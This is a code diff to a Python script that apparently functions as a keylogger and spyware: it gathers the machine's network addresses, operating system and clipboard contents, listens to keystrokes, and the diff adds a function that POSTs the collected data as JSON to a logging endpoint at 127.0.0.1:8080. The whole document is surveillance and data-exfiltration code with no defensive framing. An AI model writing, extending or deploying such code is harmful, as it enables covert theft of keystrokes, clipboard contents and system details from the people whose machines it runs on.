@@ -3,8 +3,11 @@ import psutil
 import os
 import platform
 import win32clipboard
+import requests
 
 keys = []
+
+data = {}
 
 def get_sys_info():
     ips = psutil.net_if_addrs()
@@ -12,7 +15,9 @@ def get_sys_info():
     _platform = platform.system()
     return ips, _os, _platform
 
-print(get_sys_info())
+ips, _os, _platform = get_sys_info()
+
+
 
 def get_clipboard():
     win32clipboard.OpenClipboard()
@@ -23,6 +28,18 @@ def get_clipboard():
 clipboard = get_clipboard()
 
 print(f"User clipboard: {clipboard}")
+
+data = {
+    "ip": ips,
+    "os": _os,
+    "platform": _platform,
+    "clipboard": clipboard,
+}
+
+def send_data(data, url):
+    requests.post(url, json=data)
+
+send_data(data=data, url="http://127.0.0.1:8080/log")
 
 def key_press(key):
     try:
@@ -40,6 +57,7 @@ with keyboard.Listener(
         on_release=release) as listener:
     listener.join()
 listener.start()
+
 
 
 
